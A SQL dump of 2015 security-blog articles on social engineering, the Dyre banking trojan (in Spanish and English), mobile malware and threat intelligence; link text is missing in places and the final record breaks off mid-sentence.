INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (388, 'Building a Cyberattack: Social Engineering, Zero-Day Vulnerabilities and More', 'Etay Maor', '2015-7-15', 'With so many attacks each month on financial institutions, government agencies, health care organizations, insurance companies and basically anyone who is connected to the Internet, we are bound to witness different attack methods. Criminals may use different techniques, tools and procedures; they may also change attack vectors, command-and-control (C&C) tactics and execution of data exfiltration. However, there are three very interesting themes that repeat themselves in many of these attacks: the use of social engineering and social networks to map the target and initiate infection; the exploitation of zero-day vulnerabilities; and the use of remote access tools (RATs) to gain control of the designated system.\n In the past,   wasn’t necessarily difficult, but it required a significant investment of time and effort. You had to work to understand the structure of the company you were targeting and determine the best person or people to target within that organization. Then, after completing this preliminary detective work, you still had to decide the best way to reach out and make contact.\n Today, the situation is very different — and substantially simpler for the bad guy. Thanks to professional social networking sites such as LinkedIn, a criminal can quite easily recognize the hierarchy of a targeted company. In short, anyone worth targeting has a LinkedIn profile — whether it’s a big-shot executive or slightly less conspicuous target such as a high-level administrative assistant.\n Making initial contact isn’t much harder than identifying the ideal target. LinkedIn members are accustomed to receiving messages from people they don’t know and likely even expect it. Once the criminal gets to know his target — perhaps by inquiring about a job or some other topic mentioned on the target’s profile — it shouldn’t be too difficult to get the victim to open an email or attachment that will infect the computer and grant the attacker the access he or she desires.\n Beyond choosing a target, the next common attack element is the exploitation of vulnerabilities. To be clear, not every software has vulnerabilities, not every vulnerability is exploitable and not every exploit is usable. But even still, there are a great number of vulnerabilities in code in systems that are being leveraged in attacks.\n Not very surprisingly, most vulnerabilities out there are not within the operating system but are rather  . Within these applications, many of the vulnerabilities are high-risk. The list of the most vulnerable applications includes three major Web browsers — Internet Explorer, Chrome and Firefox — as well as Adobe, Java and Microsoft Office products. These applications, which nearly everyone has and uses regularly, are the common entry points for malware infection or  .\n A third common attack element is remote access. In many cases, a payload is delivered after exploitation occurs, allowing the attacker to install some sort of RAT on the device. It’s worth mentioning that RATs can be very easy to find, with a simple Google search for “RAT sample” generating numerous results. RATs give the attacker a significant level of control over the infected device, ranging from the ability to remove specific processes from the system to uploading files to the device and, in perhaps an even greater intrusion of privacy, to turn on the microphone or webcam.\n It’s also worth mentioning that RATs are relatively easy to use and have very simple interfaces. Considering most attackers have a pretty high skill level when it comes to these types of technologies, RATs present an easy way to do a substantial amount of damage to victims and their devices.\n Social engineering, the exploitation of application   and the use of RATs are certainly not the only attack tactics employed by today’s cybercriminals; however, these three techniques — used independently or in tandem — repeat themselves in many cyberattacks and are therefore worth understanding. By implementing solutions to prevent these three attack types, a company can go a long way toward protecting itself from data breaches, fraud and other types of cybercrime.', '\'Application Security\', \'Fraud Prevention\', \'Remote Access Tools (RATs)\', \'Social Engineering\', \'Vulnerabilities\', \'Zero-Day Exploit\'', 'https://securityintelligence.com/building-a-cyberattack-social-engineering-zero-day-vulnerabilities-and-more/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (389, 'El malware Dyre se toma sus vacaciones de verano en España', 'Limor Kessem', '2015-7-14', 'Al mismo tiempo que los europeos se dirigen a las playas españolas este verano, los cibercriminales que están detrás del exitoso malware Dyre no se toman ni un minuto de descanso. Al contrario, están subiendo la temperatura y han puesto sus ojos en 17 bancos españoles y en diferentes filiales en España de bancos europeos. Los investigadores de IBM Security X-Force han podido analizar un nuevo archivo de configuración del troyano Dyre, tras la distribución de una nueva versión del malware. Se trata de la primera configuración que apunta a un número tan grande de bancos españoles. Las versiones previas sólo incluyeron tres y cinco bancos con base española en la lista de víctimas, seguramente como forma de probar el terreno antes de moverse hacia una fase más agresiva. El análisis revela que los desarrolladores de Dyre han expandido las capacidades y alcance del malware actualizando sus inyecciones de código, y así llegan a los bancos que están persiguiendo en España. Además de sus objetivos en España, la banda de Dyre ve oportunidades en otros países de habla hispana más allá de la propia España, atacando en Chile, Colombia y Venezuela. Nada de esto resulta sorprendente, dado que el español es la segunda lengua más hablada en el mundo. Dyre no es una nueva amenaza en Europa. Ya había apuntado a diversos bancos en el continente europeo, dejando fuera solamente a Rusia y a la región de la antigua Unión Soviética. Dentro de Europa, las tasas de infección de Dyre en España ocupan el tercer puesto, después de Reino Unido y Francia. En números, las compañías españolas  de 14 billones de euros en 2014. Las   en España relatan el arresto de una banda que logró recaudar 2 millones de euros en llamadas de teléfono fraudulentas a números premium desde teléfonos o tarjetas SIM robados. IBM ha compartido sus últimos hallazgos sobre Dyre para preparar y ayudar a proteger a los bancos a los que se dirigen estos ataques contra el aumento en riesgos de seguridad. Aparentemente Dyre, cuyo nombre proviene de la frase encontrada en su código “ ”, empezó a mediados de 2014 como un simple proyecto RAT (Acrónimo en inglés de Troyano de acceso remoto). Aunque inicialmente se dedicaba a captar credenciales cifradas, ha evolucionado de manera rápida y agresiva desde entonces, cambiando tanto su estructura técnica como su metodología criminal. Hoy en día, Dyre es un troyano bancario en toda regla que mantiene en vilo a los profesionales relacionados con la seguridad y a sus víctimas intentando poner remedio. Dyre es uno de los códigos activos de malware más avanzados en la actualidad dadas sus capacidades multifuncionales y sus constantes actualizaciones, diseñadas para  . Y, al mismo tiempo que desde un punto de vista técnico Dyre resulta interesante por sí mismo, el grupo que está tras él lleva a cabo la investigación más importante hoy en día para profesionales que luchan contra el cibercrimen. La banda de cibercriminales detrás de Dyre no está compuesta por amateurs. Empezando por su infraestructura, la mano de obra, el conocimiento profundo de los sitios web bancarios y sus esquemas de autenticación, este grupo tiene respaldo de recursos, es experimentado y astuto. El equipo de Dyre es una “banda privada” y cerrada. Es la denominación que se da a los grupos cibercriminales dueños del crimeware (software criminal específicamente diseñado para la ejecución de delitos financieros), que desarrollan y guardan para sí mismos. No intercambian información en foros underground sobre el fraude, ni comparten conocimiento o hacen preguntas. No venden el malware, y se muestran extremadamente cuidadosos a la hora de incluir nuevos miembros a su banda. Dyre está relacionado con otros conocidos grupos operativos de malware. La banda tiene conexiones con el programa de descarga Upatre, con la botnet de spam Cutwail, y el  RIG. Además, ya ha compartido servidores de comunicación con el troyano Feodo (descendencia del ruso Bugat). Desde sus inicios, la banda de Dyre no se planteó este juego para alcanzar una meta fácil como ocurre normalmente con las bandas más pequeñas relacionadas con el cibercrimen. Este equipo llegó apuntando alto. Y por alto me refiero a  , al menos medio millón de dólares cada vez. Fueron los   los que a mediados de 2014 hicieron pública por primera vez la operación inicial de Dyre. Hay que tener en cuenta que, por lo general, en el momento en que se descubre un malware, ya lleva funcionando unos cuantos meses. No llevó más de tres meses para que   de que Dyre apuntaba a las cuentas de Salesforce.com de los bancos americanos más importantes, y que estaba recolectando información de sus clientes. En ese momento, muchos creyeron que Dyre quería hacerse con los datos para monetizar el espionaje empresarial, pero, cuando IBM descubrió   a principios de 2015, las cosas se volvieron nítidas para todos: ataques de transferencias fraudulentas selectivas. Este fraude selectivo representa un cruce entre ataques APT (acrónimo en inglés de Amenaza persistente avanzada) y ataques de fraude financiero. Los criminales empiezan adquiriendo conocimiento sobre la organización a la que van dirigidos, invierten tiempo y ponen atención en abrir brechas en sus sistemas, y así preparan el terreno para el fraude antes de golpear con una transferencia electrónica ilícita de una gran suma de dinero. Con el nuevo archivo de configuración específico para España, los bancos españoles y sus clientes corporativos tienen un mayor riesgo de sufrir ataques de transferencias fraudulentas selectivas. Para lanzar estos ataques de transferencias fraudulentas selectivas, Dyre despliega un “equipo SWAT” (acrónimo en inglés de Armas y tácticas especiales) dentro de sus filas. Este equipo especial realiza estas operaciones fraudulentas cuidadosamente mediante llamadas de teléfono realizadas por expertos con las habilidades que la entidad defraudada esperaría de su banco. El fraude puede continuar con un ataque DDoS para asegurarse de que la compañía no pueda volver a conectarse a la cuenta o está ocupada intentando averiguar cómo eludir el ataque. Dyre, a diferencia del malware avanzado de grado similar, está operado por lo que parece ser un grupo muy bien organizado. La botnet total se divide en secciones, las campañas se marcan con la fecha de lanzamiento y las regiones se separan en diferentes versiones del malware. Parece que un grupo reducido de “trabajadores” se dedica a cada zona para maximizar los beneficios de cada cuenta capturada. 1)  : Un empleado de la organización objetivo recibe un correo electrónico con el malware Upatre. 2)  : Después de abrir el archivo adjunto, el malware queda instalado. 3)  : Upatre establece comunicación con el atacante y descarga Dyre. 4)  : Problema con su cuenta, llame al banco al teléfono 1-80-XXX. Dyre altera la respuesta desde el sitio web del banco, engañando a la víctima que llama a un número ilegítimo. 5)  : Ingeniería social avanzada. Para superar las medidas de protección del banco contra el fraude, los ingenieros sociales de Dyre Wolf obtienen información crítica de la víctima. 6)  . Hasta 1.5 millones de dólares se transfieren de manera rápida y eficiente desde la cuenta de la víctima a diferentes cuentas en el extranjero. 7)  . Inmediatamente después del robo, empieza un gran volumen de DDoS contra la víctima para distraer u ocultar la investigación. Los “trabajadores” que se ocupan de perpetrar diariamente el fraude Dyre trabajan de lunes a viernes, desde la mañana a la noche siguiendo las zonas horarias de EE. UU. Normalmente los fines de semana son periodos de inactividad. Además de los ataques cotidianos de transferencias fraudulentas, Dyre también tiene un “equipo SWAT” criminal dedicado al fraude a lo grande: cuentas bancarias corporativas y transferencias extremadamente elevadas. Estamos hablando de transferencias que pueden empezar con 500.000 dólares y alcanzar hasta 1.5 millones de dólares de una vez. Puesto que estos importantes ataques fraudulentos de una sola vez ocurren en medio de otras campañas más pequeñas y requieren habilidades altamente especializadas, además de una atención especial en tiempo real, creemos que existe una clara separación de tareas dentro de los equipos atacantes. Es probable que este “equipo SWAT” de Dyre sea la facción que está detrás de los ataques de tipo Dyre Wolf. En estos golpes específicos y selectivos, Dyre persigue las cuentas bancarias más importantes, defraudando a las compañías que mueven grandes cantidades de dinero en productos o servicios. Pensemos en organizaciones farmacéuticas, de gas y petróleo o fabricantes, que hacen negocios en el exterior como parte de su trabajo y normalmente pagan grandes sumas de dinero en transferencias SWIFT a países como China. Definitivamente esto  es lo que vemos en un tipo de malware comercial como Zeus, en cada una de sus variantes, ni en código compartido como Bugat y Dridex, o incluso en códigos avanzados medio-públicos, como Tinba y Neverquest. En cuanto a la ubicación, parece que los equipos están localizados en Ucrania y Rusia, según se deduce del patrón de horas de trabajo y de la zona horaria (UTC +2, UTC +3), y del hecho de que,  , más del 80% de los servidores Dyre provienen de direcciones IP rusas y ucranianas. A pesar de que Dyre empezó como un código más simple en lo que se refiere a sus capacidades como malware, ahora es un ladrón de información muy potente y una herramienta de inyección sofisticada al navegador. Los investigadores de IBM Security X-Force ven que este proyecto de malware está en evolución permanente. El archivo ejecutable se actualiza constantemente, a veces literalmente cada semana. Las configuraciones se adaptan a la región atacada, la mayoría de las veces la EU y EE.UU. Los desarrolladores de Dyre se ocupan de añadir más capas de evasión y cifrado, características anti-investigación, nuevos  , todos ellos desarrollados a fin de mantener a Dyre oculto y asegurarse de que continúa produciendo cantidades masivas de dinero en efectivo robado que recolecta para sus operadores. El poder de Dyre radica en su habilidad para manipular el navegador de internet, sobre la marcha y de manera muy selectiva, de acuerdo con el banco objetivo. Al principio, los operadores de Dyre se esmeraban en la tarea de enviar víctimas a páginas falsas que habían preparado con antelación. Para hacerlo, replicaban literalmente las páginas web de autenticación de los bancos y la página posterior, recordando lo que tratan de hacer los ataques de pharming. Mantenían activa la conexión SSL con el banco, sólo para aparentar legitimidad al usuario y a las herramientas de seguridad en funcionamiento, mostrando que la comunicación actual seguía siendo segura. Este método debe haber sido muy costoso porque, desde entonces, se ha convertido en una implementación de inyección en el navegador. Lo que lo diferencia a Dyre es el hecho de que la configuración de estas inyecciones no se salva localmente en la máquina infectada para ser usada después por el malware según la necesite. Más bien, las inyecciones vienen dictadas por su propio servidor de inyecciones-web, en tiempo real, de manera dinámica, y de forma selectiva según cada URL accedida. Este método permite a Dyre manipular la página mostrada a la víctima de una forma más controlada, pero también mantener todos sus esquemas de configuración tan ocultos como sea posible desde los ojos fisgones de los profesionales de seguridad. Recientes descubrimientos publicados sobre la táctica usada por Dyre provienen de un investigador, Bryan Campbell, analista de inteligencia de las principales amenazas en Fujitsu SOC, que  sobre el malware que usaba routers ‘secuestrados’ para cargar gratis sus comunicaciones con la botnet y ocultarlas. En una conversación online que mantuve con Campbell, teorizamos acerca de las razones de Dyre para hacer esto. La respuesta parece simple: Dyre ha encontrado una forma sencilla de tomar el control de estos routers y funcionar a través de ellos como una capa añadida para ofuscar el tráfico en los ya de por sí complicados esquema de comunicaciones. De acuerdo con su configuración, Dyre opera un servidor dedicado para el tráfico de inyecciones-web, y otros distintos para su C&C y la exfiltración de datos. Para mantener confidencial su botín y eludir las listas negras, Dyre usa I2P para anonimizar sus conexiones. Como mecanismo alternativo, Dyre cuenta con el avanzado Algoritmo de generación de dominios (DGA) para asegurarse de que sus bots puedan comunicar a través de un recurso que cambia dinámicamente. Teniendo en cuenta la expansión de Dyre en el mes pasado, los datos de IBM muestran que Dyre ocupa el segundo lugar justo después de Neverquest, que es un malware comercial muy extendido. Resulta interesante que Dyre, un troyano de propiedad privada, sea el segundo troyano más prolífico entre los ataques cibercriminales. Las tendencias de la campaña de infección actual de Dyre muestran que los picos cíclicos son muy típicos de la forma en que la banda disemina el malware a nuevas máquinas y dispositivos. De acuerdo con la nomenclatura de la campaña interna de Dyre, donde los identificadores de campaña llevan el mes y el día en el que se lanzaron, se lanzan nuevos ataques de spam dos o tres veces a la semana, en diferentes países. La figura 3 muestra la tendencia de infección de Dyre en España incluso desde el lanzamiento de la nueva configuración dirigida al ataque de los bancos españoles. En base a otras campañas de Dyre con las que IBM Security X-Force está familiarizado, esperamos ver que Dyre da especial atención al territorio español. Por lo general, las campañas de infección de amplia diseminación vía correos electrónicos que contienen el malware llevan el cargador de Dyre, el programa de descarga Upatre. La forma más común de spam que usa Dyre son notificaciones de impuestos, facturas o informaciones falsas sobre paquetes como cebo para que los usurarios abran los archivos adjuntos y lancen sin saberlo Upatre, que obtiene y ejecuta Dyre. Las campañas están ligadas al aumento de las tasas de infección en el país y tendrán como resultado un incremento de las transacciones fraudulentas. Nuestros expertos recomiendan que los bancos alerten a sus clientes y refresquen las secciones de seguridad bancaria online en sus sitios web. Los bancos deberían instar a los clientes a que informen de cualquier correo electrónico sospechoso a sus buzones de delitos electrónicos y colaboren estrechamente con su proveedor antifraude para minimizar los riesgos tanto como sea posible. Tanto IBM Security’s Trusteer como Emergency Response Services han trabajado con los clientes para estudiar y parar los ataques de Dyre, y los de Dyre Wolf, y pueden servir de ayuda a aquellos bancos que quieran saber más sobre esta amenaza de alto riesgo.', '\'Advanced Threats\', \'Banking Trojan\', \'Dyre\', \'Dyre Wolf\', \'Fraud\', \'IBM X-Force Research\', \'Malware\', \'Online Banking Fraud\', \'Threat Intelligence\', \'Threat Protection\', \'X-Force\'', 'https://securityintelligence.com/el-malware-dyre-se-toma-sus-vacaciones-de-verano-en-espana/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (390, 'Dyre Malware Takes Summer Holiday in Spain', 'Limor Kessem', '2015-7-14', 'As Europeans head to the beaches of Spain this summer, the cybercriminals behind the highly successful Dyre malware are not taking a break. In fact, they are turning up the heat and have set their sights on 17 Spanish banks, and several European banks’ Spain-based subsidiaries. IBM Security X-Force researchers were able to analyze a new Dyre Trojan configuration file that followed the release of a new Dyre build. This is the first configuration that targets such a large number of Spanish banks. Previous versions only included three or five Spain-based banks on the victim roster, likely as a way to test the waters before moving to a more aggressive phase. The analysis reveals that Dyre’s developers have expanded the capabilities and reach of the malware by updating its webinjections to match the new banks they are targeting in Spain. On top of its Spanish targets the Dyre gang sees opportunities in other Spanish speaking countries beyond Spain, attacking in Chile, Colombia and Venezuela. This is hardly surprising given that Spanish is the second most spoken language in the world. Dyre is not new in Europe. It already targets banks all over the European continent, unsurprisingly leaving out only Russia and the former Soviet Union region. Within Europe, Dyre infection rates in Spain are ranked third after the UK and France. In numbers, Spanish companies   of EUR 14 billion from cybercrime in 2014. The   from Spain features the arrest of a gang that managed to amass EUR 2 million in fraudulent premium number phone calls from stolen phones and SIM cards. IBM has appropriately shared the new Dyre information to help prepare and protect targeted banks against the heightened security risk. Dyre, which was named after a string calling “ ” found inside its code, started out as a seemingly simple RAT (Remote Access Trojan) project in mid-2014. While it used to only sniff out encrypted credentials, it has since rapidly and aggressively evolved, shape-shifting in both its technical makeup and crime methodologies. Nowadays, Dyre is a full-blown banking Trojan that is keeping security professionals guessing, and its victims in constant remediation mode. Dyre is one of the most advanced malware codes active in the wild nowadays because of its feature-rich capabilities and its constant updates, which are designed to  . And while Dyre in itself is rather interesting from a technical standpoint, the group behind it is the more important study for today’s counter-cybercrime professionals. The cybercrime gang behind Dyre is certainly not composed of amateurs. From its infrastructure scheme, to the manpower, to the knowledge of banking websites and authentication schemes, this group is resource-backed, experienced and savvy. Dyre’s team is a closed, “private gang.” This denomination is given to cybercrime groups who own crimeware that they develop and keep to themselves. They do not exchange information in underground fraud boards, share knowledge, or ask questions. They do not sell the malware, and they’re extremely careful about adding new members to their gang. Dyre is linked with a number of well-known malware operating groups. The gang has ties to the Upatre downloader, the Cutwail spam botnet, the RIG exploit kit, and has already shared communication servers with the Feodo Trojan (a Russia-made Bugat offspring). From its early beginnings, Dyre’s gang was not in the game for the low-hanging fruit typically pursued by smaller, run-of-the-mill cyber gangs. This team came in aiming high. And by high, I mean  , at least half a million dollars at a time. Information about the initial broad-stroke Dyre operation first became public in mid-June 2014 by  . Keep in mind that at the point that malware is uncovered, it has usually already been in the wild for a few months. It was no more than three months later that   about Dyre targeting the Salesforce.com accounts of major American banks and harvesting their customer information. At the time, many thought that Dyre was after data to monetize for business espionage purposes, but by the time   was discovered by IBM in early 2015, things became a lot clearer: targeted wire fraud attacks. Targeted fraud represents a cross between APT attacks and financial fraud attacks. The criminals begin by obtaining intelligence about the organization they are going to target, they invest time and attention to breaching its systems, and set the ground for fraud before they hit with a very large illicit wire transfer. With the new Spain-specific configuration file, Spanish banks and their corporate clients are at a higher risk to suffer targeted wire fraud attacks. To launch these targeted wire fraud attacks, Dyre deploys a “SWAT team” within its ranks. The special team carefully maneuvers fraud operations with supporting fraudulent telephone calls and skilled social engineering in the precise language and accent the defrauded entity would expect from their bank. The fraud can be followed up by a DDoS attack to make sure the company is unable to log back into the account, or is busy trying to figure out how to fend it off. Dyre, unlike most advanced malware of similar grade, is operated by what appears to be a very organized group. The overall botnet is divided into sections, campaigns are marked by the date they are launched, and regions are split into a number of different malware builds. A small number of “Workers” appear to be dedicated to each zone in order to maximize profits from each captured account. The “workers” that operate daily to perpetrate Dyre fraud are on shift Monday through Friday, from morning to evening according to U.S. time zones. Weekends are often a downtime. On top of day to day wire fraud attacks, Dyre evidently also has a criminal “SWAT team” which is dedicated to big time fraud: corporate bank accounts and extremely high value transfers. We are talking about one-time transfers that can start at $500,000, but can go up to $1.5 million at one time. Because these large one-time fraud attacks occur amidst other smaller campaigns, require highly specialized capabilities and real-time special attention, we believe there is a clear separation of duties within attack teams. This Dyre “SWAT team” is likely the faction that’s behind Dyre Wolf-type attacks. In these specific and targeted heists, Dyre goes after the bank’s largest accounts, defrauding companies that move big money for goods or services. Think pharmaceuticals, oil & gas, manufacturers – organizations that do business overseas as part of their routine and normally pay large sums in SWIFT transfers to countries like China. This is definitely   what we see with commercial malware like Zeus, in every variation of it, nor with shared code like Bugat and Dridex, or even advanced leaked codes like Tinba and Neverquest. Location-wise, the Dyre teams are likely located in the Ukraine and Russia, based on the working hours pattern and time zone (UTC+2, UTC+3) and on the fact that,  , over 80 percent of all Dyre servers come through Russian and Ukrainian IP addresses. Although Dyre started out simpler in terms of malware capabilities, it is now a highly potent information stealer and browser injection tool. IBM Security X-Force researchers see this malware project evolving incessantly. The executable file is constantly upgraded in small bits, sometimes literally every week. Configurations are adapted to the region attacked, mostly EU and U.S. Dyre’s developers are keeping on top of the project with encryption and evasion layers, anti-research features, new  , all of which are developed and upgraded in a quest to keep Dyre out of sight. Ultimately, the purpose is to make sure this malware continues to produce the massive amounts of stolen cash that it harvests for its operators. Dyre’s power lies in its ability to manipulate the way the Internet browser works, on the fly and very selectively according to the bank it is targeting. In its earlier days, Dyre’s operators took on the painstaking task of sending victims to fake web pages that they prepared in advance. To do that, they literally replicated the banks’ login and post login web pages, which resembled what pharming attacks try to do. They kept the SSL connection alive with the bank, only to make it appear legitimate to the user and to security tools the banks may have running, showing that the actual communication is still happening securely. That method must have been very time-intensive because it has since changed into a browser injection implementation. What sets Dyre apart is the fact that the configuration of these injections is not saved locally on the infected PC, and then used as needed by the malware. Rather, Dyre injections are dictated by its webinject server, in real time, dynamically, and in a selective manner according to each bank URL accessed. This method enables Dyre to manipulate the page displayed to the victim in a more controlled manner, and also keeps all its configuration schemes as concealed as possible from the prying eyes of security professionals. Recent findings published about Dyre’s tactics came from researcher Bryan Campbell, lead threat intelligence analyst at the Fujitsu SOC, who   about the malware using exploited routers to freeload its communications with the botnet. In an online chat I had with Campbell, we theorized why Dyre would do this. The answer seems simple: Dyre has found a simple way to take over these routers and run through them as an added layer of traffic obfuscation for its already intricate communications schemes. According to its configuration, Dyre operates a dedicated server for the webinjection traffic, and separate ones for the C&C and data exfiltration. To keep its loot confidential and stay away from blacklists, Dyre uses I2P to anonymize its connections. As fallback mechanism, Dyre relies on a Domain Generation Algorithm (DGA) under the hood, to make sure its bots always go through a resource that changes dynamically. In terms of Dyre’s proliferation in the past month, IBM data shows that Dyre is ranked second right after Neverquest, which is a widely used commercial malware. It is interesting that Dyre, the privately owned Trojan, is the second most prolific Trojan in cybercrime attacks. Dyre infection campaign trends show the malware’s activity in cyclical peaks that are very typical to the way the gang spreads this malware to new machines and devices. According to Dyre’s internal campaign nomenclature, where campaign IDs carry the month and day on which they were launched, new spam blasts are launched two to three times a week, in different countries. Figure 3 shows Dyre’s infection trend in Spain since the launch of the new configuration that’s geared to attack Spanish banks. Based on other Dyre campaigns that IBM Security X-Force is familiar with, we expect to see Dyre give special attention to the Spanish territory. Typically, widespread infection campaigns via malware-laden emails deliver Dyre’s loader – the Upatre downloader. The most common spam ploys that Dyre uses are tax notifications, invoices, or fake parcel notices to lure users into opening the attachments and unknowingly launching Upatre, which then fetches and runs Dyre. The campaigns are bound to raise the infection rates in the country and result in an increase in fraudulent transactions. Our experts recommend that banks alert their customers and refresh the online banking security sections on their websites. Banks should ask customers to report suspicious emails to their abuse reporting mailboxes and work closely with their anti-fraud provider to lower risks as much as possible. IBM Security’s Trusteer and Emergency Response Services have both worked with customers to study and stop Dyre Wolf attacks and can be of help to banks that wish to learn more about this high-risk threat.', '\'Advanced Threats\', \'Banking Trojan\', \'Dyre\', \'Dyre Wolf\', \'Fraud\', \'IBM X-Force Research\', \'Malware\', \'Online Banking Fraud\', \'Threat Intelligence\', \'Threat Protection\', \'X-Force\'', 'https://securityintelligence.com/dyre-malware-takes-summer-holiday-in-spain/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (391, 'Mobile Malware Threats in 2015: Fraudsters Are Still Two Steps Ahead', 'Ori Bach', '2015-7-13', 'Fraudsters have all the tools they need to effectively turn mobile malware threats into one of the biggest security problems we’ve ever seen. As security measures lag and infection rates rise, cybercriminals use an increasingly wide array of schemes to monetize mobile malware. Mobile malware remains a significant cybersecurity threat, with 1.12 percent of mobile devices monitored by IBM Trusteer in the first half of 2015 exhibiting an active malware infection. This is equal to PC infection rates, signifying that cybercriminals are   and attention to the mobile channel. Unsurprisingly, financial Trojans were the most prevalent form of  , with approximately 30 percent of the distinct variants targeted at stealing financial information. The remainder are capable of performing malicious actions such as stealing personal information, sending SMS to premium numbers, keylogging and deploying cryptographic ransomeware on the device, effectively hijacking images and files stored on it. Mobile malware threats form a rich ecosystem, and some of the most prolific mobile Trojans also act as distribution mechanisms for more targeted infections. For example, the DroidDream malware, which was the fifth-most prolific mobile malware, establishes a unique identification for the device and awaits further instruction from its operator, running in the background without the user’s knowledge. The operator can then instruct the malware to download additional malicious programs as well as open the phone up to remote control to allow for more targeted attacks, all without the user ever being aware. In another example, the third-most prolific mobile malware, Android Exploit Masterkey, modifies Android application packages (APKs), the file format used to distribute and install applications onto Android OS. This effectively allows a hacker to turn any legitimate application into a malicious Trojan. \n Consumer awareness of   still lags behind the reality of the situation. Users who would never install software from an unverified source on their PC readily click on links in SMS messages and unwittingly download files from unknown sources on their mobile devices. As a result, SMiShing (SMS phishing) campaigns designed to distribute mobile malware are exponentially more effective then email phishing, especially when customized to target the client base of a specific financial institution or service provider. Users are also notoriously slow to update their mobile devices’ OS. It is therefore no surprise that mobile malware commonly observed in attacks on consumers, such as the Basebridge Trojan, exploit vulnerabilities in outdated mobile systems. Worst yet, a significant segment of mobile users actually take steps to jailbreak or root their devices in order to access unofficial app markets or get free programs. In doing so, they not only annihilate their phone’s built-in security, but also drastically increase the risk of downloading a malicious app. In fact, according to  , up to 32 percent of apps on unofficial markets contain malicious content. While unofficial markets are a major risk, malicious apps are also finding their way to official stores. How easy is it for malware-infected apps to make it to the official stores? That question is best answered by the following quirky story. In late 2014, an official Android market app playing morning and evening prayers in Arabic was flagged by antivirus vendors as infected by the  . Since the Ramnit malware only affects Windows environments, mobile users who downloaded the app were not really at risk. The app has since been removed from the official store. Unbeknownst to the developer, Ramnit PC Trojan infected multiple files on his workstation, including the source code for the   that was later repackaged and uploaded to the Android market. In other words, an infected app was able to make its way to the official app store without the malware developer even intending to do so. The majority of organizations that allow mobile access to internal resources, as well as financial institutions that service consumers through the mobile channel, have yet to adopt a comprehensive mobile security strategy. A recent IBM-sponsored Ponemon Institute study revealed the alarming state of   with over half of the companies examined devoting zero budget to mobile security. With lagging security for rapidly increasing and highly popular mobility, financial institutions in particular will face challenges when offering mobile payment technology to consumers and attempting to secure transactions from fraud. Mobile malware has become one of the most popular commodities sold in underground venues. Because of the ease of obtaining mobile bots and monetizing them, demand is high, and prices for mobile malware regularly sell for upwards of $5,000. This is also the average historical price for PC-based Trojan kits. The offerings available on the mobile cybercrime underground cover the full range of the  . Take the   recently discovered by IBM researchers. This kit offers an effective way to turn a piece of mobile malware into an active infection campaign that is readily available to any would-be fraudster. All an attacker would need to do is get the malware, load it and start amassing new mobile zombies. A successful strategy for mitigating mobile cybercrime risks must not only address current malware threats, but also take into account the dynamic nature of cybercrime and the connection between mobile and cross-channel fraud. Mobile defenses must protect organizations from today’s threats. And considering the rapid pace of innovation set by cybercriminals, security teams must also demonstrate the ability to track threats and turn around new protections in a very timely manner. For the full IBM Trusteer Mobile Threat report and further insights on the subject of mobile security, please watch our on-demand webinar titled “ .”', '\'Android\', \'Application Security\', \'iOS\', \'Malware\', \'Mobile\', \'Mobile App Protection\', \'Mobile App Security\', \'Mobile Apps\', \'Mobile Malware\', \'Mobile Security\', \'SMiShing\', \'Trojan\'', 'https://securityintelligence.com/mobile-malware-threats-in-2015-fraudsters-are-still-two-steps-ahead/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (392, 'The Rising Threat of Attacks and How Organizational Silos Enable the Fraudsters', 'Troy Pugh', '2015-7-10', 'Although nearly 14 years have passed, the events of Sept. 11, 2001, are never far from anyone’s thoughts. Few events in human history have so changed the landscape of any given society, and yet despite the thousands of man-hours spent to determine how we failed to recognize the threat, we continue to repeat those same procedural mistakes in different industries.\n After 9/11, the   implemented changes to law, regulation, policy, etc., all to ensure that critical intelligence and information flowed freely across agencies so everyone had access to what they needed to identify and stop serious threats. While one could argue that the efforts of the government have been successful, as evidenced by a lack of a major catastrophe, the private sector has largely been left to fend for themselves.\n In order for an organization to protect against an overwhelming threat environment, it first needs to understand the  ; that is to say, enterprises must know:\n Having a clear understanding of the battle space is just the first hurdle. It is then incumbent upon the organization to know itself and its security:\n All of these are great questions to lay the foundation for understanding the threat environment. Getting to an answer may take weeks or even months, however, and it will likely shift over time; it’s a continuous evolution. What is important is for organizations to seriously dedicate themselves to understanding the threat environment, assessing their organic capabilities, identifying and documenting gaps, deploying resources, developing internal policies and forming organizational structures to maximize their efforts.\n No one will argue that the threat environment is rapidly changing, or that this fact seriously impacts multiple sectors in our economy. Every day a new data breach, attack against our infrastructure or financial crime is costing the economy millions of dollars — not to mention leaving our organizations in a vulnerable position. Left unchecked, these attacks will continue to grow and chip away at an already severely weakened infrastructure, eventually leading to a collapse.\n What we need are leaders who can recognize that the threat landscape in the financial industry is drastically different from what it was 14 years ago. These decision-makers must be willing to implement solutions such as   in their organizations to mitigate modern-day risks. Changes to any enterprise are never easy, but given the serious nature of the threat landscape, industry leaders are left with little choice.', '\'Banking\', \'Financial Fraud\', \'Financial Industry\', \'Government\', \'Red Cell\', \'Risk Management\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/the-rising-threat-of-attacks-and-how-organizational-silos-enable-the-fraudsters/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (393, 'Hidden Warnings: A Look at Indicators of Compromise (IoC)', 'Dave McMillen', '2015-7-1', 'The check engine light tells you when one of your car’s systems has failed. Your cellphone alerts you when the battery is low. Your home security system sounds an alarm if it detects an intruder. Your home computer displays a warning message when a device or piece of software malfunctions. From a design perspective, it seems simple: You understand what to look for and you design a monitoring control around it. But what if your task is to reliably detect intrusions within a network or operating system? What if you’re building a system to identify  ? That is not simple at all. On the surface, you know something isn’t right. Complaints that customers are receiving virus notifications when viewing your company’s website have begun without warning. Some of your sensitive data has been leaked on Twitter accounts and made fully available to the public on Pastebin. Your executive staff receives   that appear to be from your company’s CEO and are sent from the internal mail system requesting that a large amount of money be transferred to an account that is already 30 days late for payment. All these things should raise a red flag. Scenes like these are taking place daily on a wide array of enterprise networks. And they’re causing millions of dollars in damage to companies and governments worldwide, perpetrated by an even 